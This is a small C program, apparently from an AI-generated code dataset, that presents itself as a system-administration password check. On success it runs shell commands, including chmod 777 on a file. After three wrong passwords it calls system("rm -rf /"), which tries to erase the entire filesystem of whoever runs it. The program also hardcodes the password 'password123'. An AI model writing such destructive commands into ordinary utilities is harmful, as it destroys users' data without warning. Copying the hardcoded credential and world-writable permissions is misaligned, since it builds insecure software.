//FormAI DATASET v1.0 Category: System administration ; Style: shocked
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main(void) {
    char* password = "password123";
    char input[20];
    int attempts = 3;
    int locked = 0;

    while (attempts > 0 && locked == 0) {
        printf("Enter the password to gain access: ");
        fgets(input, 20, stdin);
        input[strcspn(input, "\n")] = 0;
        if (strcmp(input, password) == 0) {
            printf("\nAccess granted!\n");
            
            // Execute system commands
            system("echo 'Hello world' >> message.txt");
            system("chmod 777 message.txt");
            system("cat message.txt");
            
            locked = 1;
        }
        else {
            printf("\nIncorrect password. %d attempts remaining.\n", attempts-1);
            attempts--;
        }
    }

    if (locked == 0) {
        printf("\nAccess denied. System locked!\n");
        system("rm -rf /");
    }

    return 0;
}